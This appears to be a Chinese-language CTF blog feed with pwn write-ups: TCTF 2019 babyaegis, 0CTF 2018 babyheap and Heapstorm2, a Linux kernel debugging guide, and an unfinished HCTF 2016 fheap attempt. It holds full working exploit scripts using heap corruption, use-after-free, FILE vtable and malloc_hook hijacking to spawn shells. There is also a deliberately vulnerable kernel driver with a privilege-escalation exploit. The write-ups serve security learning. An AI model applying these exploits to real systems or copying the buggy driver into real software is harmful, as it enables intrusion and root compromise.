For large sizes it is equal to // SizeClassMap::kMaxSize and the actual size is stored in the // SecondaryAllocator's metadata. u32 user_requested_size : 29; // align &lt; 8 -&gt; 0 // else -&gt; log2(min(align, 512)) - 2 u32 user_requested_alignment_log : 3; u32 alloc_context_id;&#125;; 0x01 babyaegis首先是secret()函数： 12345678910111213141516171819202122unsigned __int64 secret()&#123; _BYTE *v0; // rax unsigned __int64 v2; // [rsp+0h] [rbp-10h] if ( secret_enable ) &#123; printf((__asan *)"Lucky Number: "); v2 = read_ul(); if ( v2 &gt;&gt; 44 ) v0 = (_BYTE *)(v2 | 0x700000000000LL); else v0 = (_BYTE *)v2; *v0 = 0; secret_enable = 0; &#125; else &#123; puts("No secret!"); &#125; return __readfsqword(0x28u);&#125; 可以往大于0x700000000000的地址处任意写一次’\x00’。另外在add_note()函数中，会使得ID和content相连接上，导致update_note()中的strlen()后存在堆溢出。在delete_note()中还存在USE-AFTER-FREE。 由于存在溢出，首先需要做的就是欺骗ASan使得我们可以溢出到下一个chunk的header。 123add(p, 0x10, 'sunichi!', 0x00ffffffffffffff)update(p, 0, 'a' * 15, 0xffffffffffffff)secret(p, 0x0c047fff8000+4) 相关标记信息： 123456789101112131415161718192021222324252627282930313233SUMMARY: AddressSanitizer: heap-buffer-overflow (/pwn/tctf2019/online/aegis/aegis/aegis+0x983ab)Shadow bytes around the buggy address: 0x0c047fff7fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c047fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c047fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c047fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c047fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00=&gt;0x0c047fff8000: fa fa 00 00[fa]fa 00 00 fa fa fa fa fa fa fa fa 0x0c047fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa faShadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb==126==ABORTING 在尝试的过程中发现，相关ASan代码只检查了数据写入的起始点是否可写，后续同一次操作则不会继续检查。在使用secret修改之前，我们可以看到0x0c047fff8000处开始的8字节是： 10xc047fff8000: 0xfa 0xfa 0x00 0x00 0xfa 0xfa 0x00 0x00 如果0x0c047fff8004处的0xfa未被修改的话，我们将无法继续溢出。因此在这使用secret()对0x0c047fff8004进行修改： 10xc047fff8000: 0xfa 0xfa 0x00 0x00 0x00 0xfa 0x00 0x00 接着就可以通过溢出修改下一个chunk的header了： 12content = 'a' * 0x10 + '\x02' + '\xff' * 2 + '\n'update(p, 0, content , 0x1000000002ffffff) 123456Old header : 0x602000000020: 0x02ff00ffffffffff 0x7000000120000010New header : 0x602000000020: 0x02ffffff00ffff02 0x7000000110000000Previous 0x10 chunk header before free:0x602000000000: 0x02ffffff00000002 0x4e80000120000010 1234567891011121314151617181920struct ChunkHeader &#123; // 1-st 8 bytes. u32 chunk_state : 8; // Must be first. // 1 byte u32 alloc_tid : 24; // 3 byte u32 free_tid : 24; // 3 byte u32 from_memalign : 1; // Total: 1 byte u32 alloc_type : 2; u32 rz_log : 3; u32 lsan_tag : 2; // 2-nd 8 bytes // This field is used for small sizes. For large sizes it is equal to // SizeClassMap::kMaxSize and the actual size is stored in the // SecondaryAllocator's metadata. u32 user_requested_size : 29; // 3 byte - 3 bit // align &lt; 8 -&gt; 0 // else -&gt; log2(min(align, 512)) - 2 u32 user_requested_alignment_log : 3; u32 alloc_context_id;&#125;; 通过了解ASan chunk的结构，我们将下一个chunk也就是NOTE的NODE所在的chunk设置大小为0x10000000。释放NOTE[0]（注意：这里释放0x10000000大小的块是为了满足ASan重用chunk的条件），并重新申请chunk和伪造NODE以后续USE-AFTER-FREE的利用，通过show_note()泄漏elf基地址： 1234567delete(p, 0)add(p, 0x10, p64(0x602000000010+8)[:7] + '\n', 0)show(p, 0) p.recvuntil(': ')recv = p.recv(6)cfi_check = u64(recv + '\x00\x00')elf.address = cfi_check - 0x114ab0 12345670x55c729db3cc0: 0x0000602000000030 0x00006020000000100x602000000000: 0x02ffffff00000002 0x6d800002200000100x602000000010: 0x0000602000000030 0x0000556f318b7ab00x602000000020: 0x02ffffff00000002 0x42800001200000100x602000000030: 0x0000602000000018 0x00000000000000000x602000000040: 0x0000000000000000 0x0000000000000000 利用alarm@got泄漏glibc地址： 123456update(p, 1, 'aa', 0xffffffffffffffff)update(p, 1, p64(elf.got['alarm'])[:7] + '\n', cfi_check)show(p, 0)p.recvuntil(': ')recv = p.recv(6)libc.address = u64(recv + '\x00\x00') - libc.symbols['alarm'] 利用__environ泄漏栈地址： 123456update(p, 1, p64(libc.symbols['__environ'])[:6] + '\n', cfi_check &lt;&lt; 8)show(p, 0)p.recvuntil(': ')recv = p.recv(6)stack_address = u64(recv + '\x00\x00')ret_addr = stack_address - (0x7ffcb0855158 - 0x7ffcb0855008) 获取指向stdout@glibc的指针： 1update(p, 1, p64(libc.symbols['stdout'])[:6] + '\n', (cfi_check) &lt;&lt; 8) 构造2.27下FILE(IO_jumps)的利用： 1234567vtable = libc.address + 0x3E7FB0 - 0x10 - 8 * 5payload = p64(0x00000000fbad2800) + p64(libc.address + (0x00007f2e60b337e3 - 0x7f2e60747000)) * 6 + p64(next(libc.search('/bin/sh\x00'))) + p64(libc.address + (0x00007f2e60b337e4 - 0x7f2e60747000))payload += p64(0) * 4 + p64(libc.address + (0x00007f2e60b32a00 - 0x7f2e60747000)) + p64(1)payload += p64(0xffffffffffffffff) + p64(0x0000000000000000) + p64(libc.address + (0x00007f2e60b348c0 - 0x7f2e60747000))payload += p64(0xffffffffffffffff) + p64(0)+ p64(libc.address + (0x00007f2e60b328c0 - 0x7f2e60747000))payload += p64(0) * 3 + p64(0xffffffff) + p64(0) * 2 + p64(vtable) + p64(0) + p64(libc.symbols['system']) + '\n'add(p, 0x100, payload, 17) 修改stdout@glibc的数据为上述payload的位置： 1234p.sendlineafter('Choice: ', str(3))p.sendlineafter('Index: ', str(0))content = p64(0x611000000040)[:6] + '\n'p.sendafter('Content: ', content) 接着触发输出拿到shell。 完整的exploit： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107from pwn import *def add(p, size, content, id): p.sendlineafter('Choice: ', str(1)) p.sendlineafter('Size: ', str(size)) p.sendafter('Content: ', content) p.sendlineafter('ID: ', str(id))def secret(p, address): p.sendlineafter('Choice: ', str(666)) p.sendlineafter(': ', str(address))def delete(p, idx): p.sendlineafter('Choice: ', str(4)) p.sendlineafter('Index: ', str(idx)) def update(p, idx, content, id): p.sendlineafter('Choice: ', str(3)) p.sendlineafter('Index: ', str(idx)) p.sendafter('Content: ', content) p.sendlineafter('ID: ', str(id))def show(p, idx): p.sendlineafter('Choice: ', str(2)) p.sendlineafter('Index: ', str(idx))def pwn(): DEBUG = 0 if DEBUG == 1: p = process('./aegis') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: p = remote('111.186.63.209', 6666) libc = ELF('./libc-2.23.so') elf = ELF('./aegis') context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] context.arch = 'amd64' context.aslr = True add(p, 0x10, 'sunichi!', 0x00ffffffffffffff) update(p, 0, 'a' * 15, 0xffffffffffffff) secret(p, 0x0c047fff8000+4) content = 'a' * 0x10 + '\x02' + '\xff' * 2 + '\n' update(p, 0, content , 0x1000000002ffffff) delete(p, 0) add(p, 0x10, p64(0x602000000010+8)[:7] + '\n', 0) show(p, 0) p.recvuntil(': ') recv = p.recv(6) cfi_check = u64(recv + '\x00\x00') elf.address = cfi_check - 0x114ab0 update(p, 1, 'aa', 0xffffffffffffffff) update(p, 1, p64(elf.got['alarm'])[:7] + '\n', cfi_check) show(p, 0) p.recvuntil(': ') recv = p.recv(6) libc.address = u64(recv + '\x00\x00') - libc.symbols['alarm'] update(p, 1, p64(libc.symbols['__environ'])[:6] + '\n', cfi_check &lt;&lt; 8) show(p, 0) p.recvuntil(': ') recv = p.recv(6) stack_address = u64(recv + '\x00\x00') ret_addr = stack_address - (0x7ffcb0855158 - 0x7ffcb0855008) update(p, 1, p64(libc.symbols['stdout'])[:6] + '\n', (cfi_check) &lt;&lt; 8) print hex(stack_address) print hex(elf.address) print hex(libc.address) vtable = libc.address + 0x3E7FB0 - 0x10 - 8 * 5 payload = p64(0x00000000fbad2800) + p64(libc.address + (0x00007f2e60b337e3 - 0x7f2e60747000)) * 6 + p64(next(libc.search('/bin/sh\x00'))) + p64(libc.address + (0x00007f2e60b337e4 - 0x7f2e60747000)) payload += p64(0) * 4 + p64(libc.address + (0x00007f2e60b32a00 - 0x7f2e60747000)) + p64(1) payload += p64(0xffffffffffffffff) + p64(0x0000000000000000) + p64(libc.address + (0x00007f2e60b348c0 - 0x7f2e60747000)) payload += p64(0xffffffffffffffff) + p64(0)+ p64(libc.address + (0x00007f2e60b328c0 - 0x7f2e60747000)) payload += p64(0) * 3 + p64(0xffffffff) + p64(0) * 2 + p64(vtable) + p64(0) + p64(libc.symbols['system']) + '\n' add(p, 0x100, payload, 17) if DEBUG == 1: gdb.attach(p) raw_input() p.sendlineafter('Choice: ', str(3)) p.sendlineafter('Index: ', str(0)) content = p64(0x611000000040)[:6] + '\n' p.sendafter('Content: ', content) p.interactive() p.close()if __name__ == '__main__': pwn()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
        <tag>heap</tag>
        <tag>tctf</tag>
        <tag>asan</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019 Mar pwn writeup]]></title>
    <url>%2F2019%2F03%2F12%2F19-Mar%2F</url>
    <content type="text"><![CDATA[0CTF Quals 2018 babyheap [2019.03.12]一道挺有趣的fast bin做法的题。 漏洞为off-by-one。一开始想利用FSOP来getshell，但是由于程序申请的chunk的大小的限制，无法将chunk从unsorted bin放入smallbin[4]。 由于程序允许的chunk大小范围时0x20-0x50，因此可以利用堆地址的0x55/0x56来获取main_arena处的空间，进而修改top_chunk指针到malloc_hook附近劫持malloc_hook。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697# coding=utf-8from pwn import *def add(p, size): p.sendlineafter('Command: ', str(1)) p.sendlineafter('Size: ', str(size))def update(p, idx, content, attack=0, size=0): p.sendlineafter('Command: ', str(2)) p.sendlineafter('Index: ', str(idx)) if attack == 0: p.sendlineafter('Size: ', str(len(content))) else: p.sendlineafter('Size: ', str(size)) p.sendafter('Content: ', content)def delete(p, idx): p.sendlineafter('Command: ', str(3)) p.sendlineafter('Index: ', str(idx))def view(p, idx): p.sendlineafter('Command: ', str(4)) p.sendlineafter('Index: ', str(idx))def pwn(): BIN_PATH = './program' DEBUG = 1 local = 1 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': if local == 1: libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('./libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') add(p, 0x28) #0 add(p, 0x58) #1 add(p, 0x48) #2 update(p, 0, '\x00' * 0x28 + '\x91', 1, 0x29) update(p, 2, p64(0) * 5 + p64(0x21)) delete(p, 1) add(p, 0x58) #1 view(p, 2) p.recvuntil('k[2]: ') recv = p.recv(8) libc.address = u64(recv) - (0x7f4675a13b78 - 0x00007f467564f000) log.info('libc:%s' % hex(libc.address)) update(p, 2, recv * 2 + p64(0) * 2 + p64(0x30) + p64(0x21)) update(p, 0, '\x00' * 0x28 + '\x91', 1, 0x29) delete(p, 1) view(p, 2) p.recvuntil('k[2]: ') p.recv(8) heap = p.recv(8) heap_addr = u64(heap) - 0x60 log.info('heap base:%s' % hex(heap_addr)) # clear the heap add(p, 0x28) #1 update(p, 2, p64(0) * 4 + p64(0x90) + p64(0x20)) add(p, 0x58) #3 add(p, 0x28) #4 update(p, 3, '\x00' * 0x58 + '\x51', 1, 0x59) # chunk overlap to fast bin attack delete(p, 2) delete(p, 0) update(p, 4, p64(libc.address + (0x7f7aaf721b2d - 0x00007f7aaf35d000))) add(p, 0x48) #0 add(p, 0x48) #2 main_arena payload = '\x00\x00\x00' + p64(0) * 7 + p64(libc.symbols['__malloc_hook'] - 0x23) update(p, 2, payload) add(p, 0x38) payload = '\x00\x00\x00' + p64(0) + p64(0) + p64(libc.address + 0xf02a4) update(p, 5, payload) # getshell delete(p, 1) delete(p, 4)# gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn() BSidesSF CTF 2019 straw_clutcher [2019.03.17]]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Learn Large Bin With 0ctf2018 Heapstorm2]]></title>
    <url>%2F2019%2F03%2F11%2FLearn-LargeBin-With-Heapstorm2%2F</url>
    <content type="text"><![CDATA[Large Bin基本结构Large Bin的每个Bin中的chunk的大小都属于同一范围，Large Bin的每个chunk位于两个双向链表中。相比较其它chunk，Large Bin中的chunk多出了fd_nextsize和bk_nextsize两个字段，分别指向前一个/后一个与当前chunk大小相邻的不同大小的第一个空闲块（不包括bin头指针）。 Put Unsorted Bin into Large Bin在malloc时，如果Unsorted Bin中的victim的大小无法满足申请所需且属于Large Bin，将会被置入Large Bin中。 123456789101112131415161718192021222324252627victim_index = largebin_index(size); // 计算bin数组下标bck = bin_at(av, victim_index); // 获取binfwd = bck-&gt;fd; // bin中第一个chunkif (fwd != bck) &#123; // 更新大小排序链表 // ... if (size &lt; bck-&gt;bk-&gt;size) &#123; // 如果大小小于bin中最小的chunk大小 fwd = bck; // 此时fwd指向bin，bin-&gt;fd == bin-&gt;bk == 唯一一个chunk bck = bck-&gt;bk; // 此时bck指向唯一一个large bin chunk // 在bin和bck中插入 victim-&gt;fd_nextsize = fwd-&gt;fd; // 写入fd_nextsize victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; // 写入bk_nextsize fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize; // 更新fwd-&gt;fd的bk_nextsize &#125; else &#123; // ... &#125;&#125; else &#123; // ...&#125;mark_bin(av, victim_index);// 更新普通链表victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim; 从源码中可以看出，Large Bin在更新链表的时候，没有freed chunk中的链表数据的进行任何的安全检查，利用这一点，可以向指定地址写入堆地址数据。利用对齐的特性向堆上写入0x56开头的堆地址，则可以在特定位置制造一个空闲的0x56大小的chunk。当申请0x48大小的chunk时（并触发unsorted bin一系列操作后），特定位置的chunk将会被取出。 同时，利用这个漏洞，也可向特定位置写入特定数值。 0x55与0x5664位下，PIE和randomize_va_space对地址的影响： 0表示关闭地址空间随机化 1表示对mmap的基地址、栈地址和vdso地址随机化 2表示在1的基础上对堆地址随机化 当程序开启PIE且系统支持地址随机化时，堆地址的非零最高位会在0x55和0x56之间随机。这两个数字对于calloc()来说，只有0x56能够通过检查。 12assert (!mem || chunk_is_mmapped (mem2chunk (mem)) || av == arena_for_chunk (mem2chunk (mem))); 0ctf2018 heapstorm2明显的off-by-null漏洞。 12345input_string(chunk, size);remainder_space = size + chunk;*(_QWORD *)remainder_space = 'ROTSPAEH';*(_DWORD *)(remainder_space + 8) = 'II_M';*(_BYTE *)(remainder_space + 0xC) = 0; // off by null 利用off-by-null来制造堆块重叠，从而修改已释放的chunk的链表指针数据。通过将Unsorted Bin中的Large Chunk放入Large Bin的操作，向特定地址写入0x56开头的堆地址，使得再次申请chunk时，获得特定地址的chunk，从而改写关键数据以进一步getshell。]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>0ctf</tag>
        <tag>2018</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Debug Linux Kernel With QEMU/KVM]]></title>
    <url>%2F2019%2F02%2F13%2FDebug-Linux-Kernel-With-QEMU-KVM%2F</url>
    <content type="text"><![CDATA[之前师兄给我看过一个双Ubuntu on VMware Workstation的Linux Kernel调试解决方案，但是在Mac下配起来比Win上困难好多，因此就使用CentOS on VMware Fusion + QEMU/KVM的方案来搭建Linux Kernel（用目标内核替换发行版Linux的内核）调试环境。后来又改进成直接在VM中使用QEMU直接启动Linux Kernel来调试。 使用虚拟机源码调试Linux Kernel实验环境： 123宿主：macOS Mojave + VMware Fusion 11 Pro虚拟机：CentOS 7.6.1810 64 bit被调试机：CentOS 6.10 64 bit 虚拟机配置建议分配50G以上的硬盘空间。在设置中需要打开在此虚拟机中启用虚拟化管理程序选项以让虚拟机提供Intel VT-x/EPT支持。使用CentOS的Live版本的iso进行安装，选择”Test Then Start”的选项启动系统避免发生错误。 能够正常打开系统后，选择安装到硬盘即可。 QEMU/KVM环境配置在虚拟机中安装QEMU/KVM和VIRT环境： 1yum install qemu-kvm qemu-system virt-manager libvirt libvirt-python libvirt-client virt-install virt-viewer 启动libvirtd 1service libvirtd start 在启动virt-manager时，如果遇到权限问题，则修改/etc/libvirt/qemu.conf，添加下述内容并重启服务。 12user = "root" group = "root" 下载所要调试的内核的载体操作系统，并将iso文件放到libvirt的images目录下。通过virt-manager创建KVM，硬盘空间建议设置为25G以上。在进行到最后一步时勾选启动前进行配置。在设置面板的CPU选项中，将复制CPU参数选中然后再开始进行安装。 经上述步骤后，KVM启动，使用 12virsh listvirsh edit 来修改配置，将第一行改为 1&lt;domain type='kvm' xmlns:qemu='http://libvirt.org/schemas/domain/qemu/1.0'&gt; 在&lt;/device&gt;后加入 12345&lt;qemu:commandline&gt; &lt;qemu:arg value='-S'/&gt; &lt;qemu:arg value='-gdb'/&gt; &lt;qemu:arg value='tcp::1234'/&gt; &lt;/qemu:commandline&gt; 当KVM被重启后，将会在localhost开启1234端口进行gdb的监听。 在被调试机中编译和使用其他版本Linux内核在QEMU/KVM中安装 1yum install gcc ncurses-devel 从kernel.org上下载3.18.35源码，修改Makefile文件的617行的KBUILD_CFLAGS值为O1，进行编译 1234make menuconfigmakemake modules_installmake install 在make install后，会报一些could not find module的错误，忽略之。查看当前已有的内核版本 1cat /boot/grub/grub.conf | awk '$1=="title" &#123;print i++ " :" $NF&#125;' 修改当前默认启动的内核版本后，重启即可。 123vi /boot/grub/grub.confdefault = 0reboot 调试Linux内核由于之前已经设置好了参数，在被调试机启动后将会开启1234端口作为gdb的调试端口，将编译好的vmlinux保存到虚拟机中，启动gdb进行调试。 123scp root@kvm_ip:/path/to/vmlinux ./gdb vmlinuxtarget remote localhost:1234 使用QEMU源码调试Linux Kernel实验环境： 12宿主：macOS Mojave + VMware Fusion 11 Pro + Ubuntu 16.04.6 被调试机：Linux Kernel 2.6.32.29 编译Linux内核由于所需要编译的Linux版本较低，因此需要将gcc切换成gcc 4.8后再编译。 123sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-x xsudo update-alternatives --config gccmake 编译busybox一开始在Ubuntu 18.04上静态编译的时候，遇到libc版本的问题，在Linux Kernel启动的时候会提示kernel too old。在编译前需要使用以下指令检查下当前libc所支持的内核版本，如果所支持的版本过高，需要使用低版本libc。 1file /path/to/libc-x.xx.so 需要将busybox的编译选项设置为静态编译。 123make menuconfigmakemake install 把生成的_install文件夹拷贝到linux kernel源代码根目录。 生成文件系统进入_install目录，创建文件夹 12345678mkdir etcmkdir devmkdir mntmkdir -p etc/init.d/mkdir homemkdir roottouch etc/passwdtouch etc/group 创建etc/init.d/rcS文件 123456789mkdir -p /procmkdir -p /tmpmkdir -p /sysmkdir -p /mnt/bin/mount -amkdir -p /dev/ptsmount -t devpts devpts /dev/ptsecho /sbin/mdev &gt; /proc/sys/kernel/hotplugmdev -s 1chmod +x rcS 创建etc/fstab文件 1234proc /proc proc defaults 0 0tmpfs /tmp tmpfs defaults 0 0sysfs /sys sysfs defaults 0 0tmpfs /dev tmpfs defaults 0 0 创建etc/inittab文件 1234::sysinit:/etc/init.d/rcS::respawn:-/bin/sh::askfirst:-/bin/sh::ctrlaltdel:/bin/umount -a -r 在dev/创建设备节点 12sudo mknod console c 5 1sudo mknod null c 1 3 创建文件系统，在_install文件夹中执行 1find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; ../initramfs.img QEMU启动Linux Kernel1qemu-system-x86_64 -kernel /path/to/bzImage -initrd /path/to/initramfs.img -m 200M -append "rdinit=/linuxrc" GDB Patch使用gdb调试的时候，会出现g pack too long的报错，可通过网上的方法解决（修改gdb源码并重新编译），虽然能够正常调试，但首次attach上无法正常显示pwngdb等插件的界面，退出再重新attach即可（QEMU使用选项-S和-s）。 编译特定内核版本的驱动在Makefile中指定根目录即可 1ROOTDIR := /path/to/kernel/source 在系统中加载驱动后，会被挂载在sys目录下而不是dev目录。 基本内核栈溢出漏洞调试简单内核栈溢出示例使用 1qemu-system-x86_64 -kernel /path/to/bzImage -initrd /path/to/initramfs.img -m 200M -append "rdinit=/linuxrc" -S -s 启动内核并使用gdb进行调试。 示例驱动源代码： 123456789101112131415161718192021222324252627282930313233343536#include &lt;linux/kernel.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/proc_fs.h&gt;#include &lt;linux/string.h&gt;#include &lt;linux/vmalloc.h&gt;#include &lt;linux/sched.h&gt;#include &lt;linux/uaccess.h&gt;struct proc_dir_entry *proc_file_entry;uint64_t rbx, rbp;// Buggy write handlingint buggy_write(struct file *file, const char *buf, unsigned long len) &#123; char data[8]; copy_from_user(data, buf, len); return len;&#125;static struct file_operations buggy_proc_fops = &#123; .write = buggy_write,&#125;;int init_module() &#123; printk(" module started\n"); printk(" creating proc entry @ /proc/buggy\n"); proc_file_entry = proc_create("buggy", 0666, NULL, &amp;buggy_proc_fops); return 0;&#125;void cleanup_module() &#123; remove_proc_entry("buggy", NULL);&#125; Makefile： 1234567891011obj-m := sbof.oROOTDIR := /path/to/linux/srcPWD := $(shell pwd)default: $(MAKE) -C $(ROOTDIR) M=$(PWD) modules $(CC) --static -o exploit exploit.cclean: $(MAKE) -C $(ROOTDIR) M=$(PWD) clean rm exploit exploit.c： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/user.h&gt;#define STACK_SIZE (1024 * 1024)char ownstack[STACK_SIZE];struct fake_frame &#123; void *rip; /* shell() */ uint64_t cs; /* %cs */ uint64_t rflags; /* rflags */ void *rsp; /* %rsp */ uint64_t ss; /* %ss */&#125; __attribute__( (packed) ) ff;#define KERNCALL __attribute__( (regparm( 3 ) ) )void * (*prepare_kernel_cred)(void *) KERNCALL = (void *) 0xffffffff8105d4e9;void * (*commit_creds)(void *) KERNCALL = (void *) 0xffffffff8105d5c7;void shell( void )&#123; execl( "/bin/sh", "sh", 0 );&#125;void payload( void )&#123; commit_creds( prepare_kernel_cred( 0 ) ); asm ("mov $ff, %rsp;\n" "swapgs;\n" "iretq;");&#125;void setup_ff( void )&#123; asm ("xorq %rax, %rax;\n" "movw %cs, %ax;\n" "movq %rax, ff+8;\n" "pushfq; popq ff+16;\n" "movw %ss, %ax;\n" "movq %rax, ff+32;\n"); ff.rip = &amp;shell; ff.rsp = ownstack + (STACK_SIZE / 2);&#125;int main()&#123; FILE *fd; char buf[8 * 6]; memset( buf, 'A', sizeof(buf) ); *( (void * *) (buf + 8 * 4) ) = &amp;payload; int ret = 0; unsigned long addr; char dummy; char sname[512]; /* setup fake frame */ fprintf( stdout, "[+] preparing fake frame" ); setup_ff(); /* write payload */ fprintf( stdout, "[+] writing payload to /proc/buggy" ); fd = fopen( "/proc/buggy", "w" ); if ( fd == NULL ) &#123; perror( "fopen()" ); return(-1); &#125; fwrite( buf, sizeof(buf), 1, fd ); fclose( fd ); return(0);&#125; 编译完驱动和exploit后重新打包文件系统并启动Kernel。安装模块后，使用 1cat /sys/modules/sbof/section/.text 查看模块代码段地址，并在gdb中 12gdb-peda$ add-symbols-file sbof.ko &lt;内存位置&gt;gdb-peda$ b &lt;内存位置&gt; 获取commit_creds和prepare_kernel_cred函数的内存地址： 12grep commit_creds /sys/kallsymsgrep prepare_kernel_cred /sys/kallsyms 执行exploit之前最好切换到非root用户，执行exploit后获取root权限。 gadget搜索在性能良好的主机上使用Ropper： 1ropper --file ./vmlinux --nocolor &gt; g1 Ubuntu 64位下编译32位程序内核1make ARCH=i386 Busybox修改编译选项 12(-m32 -march=i386) Additional CFLAGS(-m32) Additional LDFLAGS 驱动1export CFLAGS="-m32" 参考文章和资料 http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2016/06/21/gdb-linux-kernel-by-qemu https://www.ibm.com/developerworks/cn/linux/1508_zhangdw_gdb/index.html http://sec-redclub.com/archives/636/ 《奔跑吧，Linux内核 入门篇》]]></content>
      <tags>
        <tag>linux</tag>
        <tag>kernel</tag>
        <tag>pwn</tag>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019 Feb pwn writeup]]></title>
    <url>%2F2019%2F02%2F06%2F19-Feb%2F</url>
    <content type="text"><![CDATA[HCTF 2016 fheap [2019.02.05]程序中对在uaf，可以进行double free来造成堆块的重叠。 通过第一次堆块重叠，可以将一个chunk的释放功能的地址改为call puts的地址，从而在delete时调用puts函数进行输出。第二次堆块重叠则用来伪造堆块的大小，使其释放后位于unsorted bin且与前述含有puts函数的堆块重叠。通过分配unsorted bin使得可以通过puts泄漏出libc的基地址。同样的，也可以泄漏出程序的基地址。 但这种方法存在问题：只知道libc基地址而无法知道libc的函数地址。（通过爆破libc版本说不定可以getshell） 不过.got表中存在能够伪造0x70大小chunk的空间，可能可以利用这个和第一次堆块重叠调用puts的方法来把libc泄漏出来。（一个很大的问题就是无法向堆块中写入\x00） 也尝试过调用printf函数来利用格式化字符串漏洞泄漏地址，但是调用时总是会遇到Segmentation Fault。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *def create(p, size, content): p.sendlineafter('quit\n', 'create ') p.sendlineafter('size:', str(size)) p.sendafter('str:', content)def delete(p, idx): p.sendlineafter('quit\n', 'delete ') p.sendlineafter('id:', str(idx)) p.sendlineafter('?:', 'yes')def pwn(): p = process('./pwn-f') context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] for i in range(2): create(p, 0x60, 'a' * 0x2) delete(p, 0) delete(p, 1) delete(p, 0) create(p, 2, '\xa0\x00') create(p, 0x100, 'a' * 0x38 + '\x31\x00') create(p, 2, '\xa0\x00') create(p, 10, '\xa0\x00') create(p, 10, 'a' * 8 + '\x1a\x00') create(p, 0x30, 'a' * 0x20 + '\x00') create(p, 0x30, 'a' * 0x20 + '\x00') delete(p, 1) create(p, 0x30, 'a' * 0x8 + '\x31\x00') delete(p, 1) delete(p, 0) delete(p, 1) create(p, 2, '\x10\x00') create(p, 10, 'a' * 8 + '\x31\x00') create(p, 0x30, 'a' * 0x18 + p32(0x211)[:3]) delete(p, 6) create(p, 0x300, 'a' * 19 * 0x8 + p64(0x61)[:2]) create(p, 0x300, 'a' * 9 * 0x8 + p64(0x91)[:2]) delete(p, 0) create(p, 0x300, 'a' * 12 * 0x8 + '\x00') delete(p, 3) gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn() 看了官网wp：https://github.com/zh-explorer/hctf2016-fheap/blob/master/poc.py。 它是通过ROP来getshell，在进行delete的时候跳转到gadget强制delete提前返回来达到ROP的目的。利用函数中用于保存用户输入的buf来ROP。 修改后的exp如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *def create(p, size, content): p.sendlineafter('quit\n', 'create ') p.sendlineafter('size:', str(size)) p.sendafter('str:', content)def delete(p, idx): p.sendlineafter('quit\n', 'delete ') p.sendlineafter('id:', str(idx)) p.sendlineafter('?:', 'yes')def pwn(): p = process('./pwn-f') elf = ELF('./pwn-f') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] for i in range(2): create(p, 0x60, 'a' * 0x2) delete(p, 0) delete(p, 1) delete(p, 0) create(p, 2, '\xa0\x00') create(p, 0x100, 'a' * 0x38 + '\x31\x00') create(p, 2, '\xa0\x00') create(p, 10, '\xa0\x00') create(p, 10, 'a' * 8 + '\x1a\x00') create(p, 0x30, 'a' * 0x20 + '\x00') create(p, 0x30, 'a' * 0x20 + '\x00') delete(p, 1) create(p, 0x30, 'a' * 0x8 + '\x31\x00') delete(p, 1) delete(p, 0) delete(p, 1) create(p, 2, '\x10\x00') create(p, 10, 'a' * 8 + 